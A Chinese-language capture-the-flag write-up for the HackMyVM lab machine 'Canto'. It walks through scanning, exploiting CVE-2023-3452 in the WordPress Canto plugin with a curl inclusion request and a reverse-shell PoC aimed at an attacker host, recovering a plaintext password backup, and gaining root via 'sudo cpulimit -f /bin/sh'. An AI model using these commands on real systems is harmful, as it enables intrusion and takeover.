# Canto

2024-11-02 https://hackmyvm.eu/machines/machine.php?vm=Canto

difficulty: Easy

## IP

192.168.5.40

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c6af1821fa3f3cfc9fe4ef04c916cbc7 (ECDSA)
|_  256 ba0e8f0b2420dc75b71b04a181b66d64 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
|_http-server-header: Apache/2.4.57 (Ubuntu)
|_http-generator: WordPress 6.5.3
|_http-title: Canto
```

wpscan --url http://192.168.5.40/ -e u 发现用户 erik

尝试包破 erik 用户的登陆密码，没用找到。尝试用字典对 web 目录进行爆破，也没找到入口点。在看 wp 有没有可利用的漏洞插件：

```
wpscan --url http://192.168.5.40/ --plugins-detection mixed
```

发现插件 canto 3.0.4，搜索后有 exp CVE-2023-3452，进行验证发现存在漏洞：

```
curl 'http://192.168.5.40/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.5.3'
```

使用此 exp 进行利用 https://github.com/leoanggal1/CVE-2023-3452-PoC

```
python3 CVE-2023-3452.py -u http://192.168.5.40 -LHOST 192.168.5.3 -LPORT 5554 -NC_PORT 8888 -s ./5.3/8888.php
```

得到 shell 后，发现是 www-data 权限，需要进一步提权。进入 /home/erik 发现 note 提示，找到 database backup：

```
find / -type d -name '*backups*' 2>/dev/null

www-data@canto:/$ cd /var/wordpress/backups/
www-data@canto:/var/wordpress/backups$ ls
12052024.txt
www-data@canto:/var/wordpress/backups$ cat 12052024.txt
------------------------------------
| Users	    |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
```

su 切换到 erik 用户，得到 user flag:

```
erik@canto:~$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

继续提权到 root：

```
sudo -l

sudo cpulimit -l 100 -f /bin/sh
# cat root.txt
1b56eefaab2c896e57c874a635b24b49
```
